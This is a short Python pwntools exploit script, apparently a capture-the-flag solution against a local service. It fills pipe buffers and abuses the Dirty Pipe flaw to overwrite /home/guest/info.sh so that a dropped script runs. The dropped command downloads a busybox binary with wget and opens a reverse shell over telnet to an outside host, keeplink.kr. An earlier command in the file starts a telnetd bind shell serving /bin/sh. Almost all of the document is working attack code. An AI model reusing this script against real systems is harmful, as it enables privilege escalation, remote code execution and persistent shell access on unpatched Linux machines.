from pwn import * 

#p = ssh("fd","127.0.0.1",22);
p = remote("127.0.0.1",31338);
#p = process("./mario")

#state-0 fulfill pipe ring 
for i in range(0,16):
    print (p.sendlineafter("cmd>","2"))
    print (p.sendlineafter("size?>","4096"))
    print (p.sendlineafter("input>","A"*4095))

for i in range(0,16):
    print (p.sendlineafter("cmd>","1"))

#stage-1 upload exploit 
p.sendlineafter("cmd>","2")

CMD="wget https://busybox.net/downloads/binaries/1.21.1/busybox-i686 && chmod +x ./busybox-i686 && ./busybox-i686 telnetd -p 2224 -l /bin/sh"
CMD="wget -P /tmp/ https://busybox.net/downloads/binaries/1.21.1/busybox-i686 && chmod +x /tmp/busybox-i686 && sleep 999 | /tmp/busybox-i686 telnet keeplink.kr 8888 | /bin/sh | /tmp/busybox-i686 telnet keeplink.kr 8889"
print(CMD)
p.sendlineafter("size?>",str(len(CMD)+1))
p.sendlineafter("input>",CMD)

p.sendlineafter("cmd>","3")
p.sendlineafter("path>","/tmp/k2rh4.sh")
input(">")
#stage-2 overwrite info.sh via dirty pipe 
p.sendlineafter("cmd>","4")
p.sendlineafter("Path>","/home/guest/info.sh")
p.sendlineafter("size?>","10")
p.sendlineafter("cmd>","2")
CMD="sh '/tmp/k2rh4.sh'"
p.sendlineafter("size?>",str(len(CMD)+1))
p.sendlineafter("input>",CMD)

p.sendlineafter("cmd>","5")


p.interactive()


p.close()
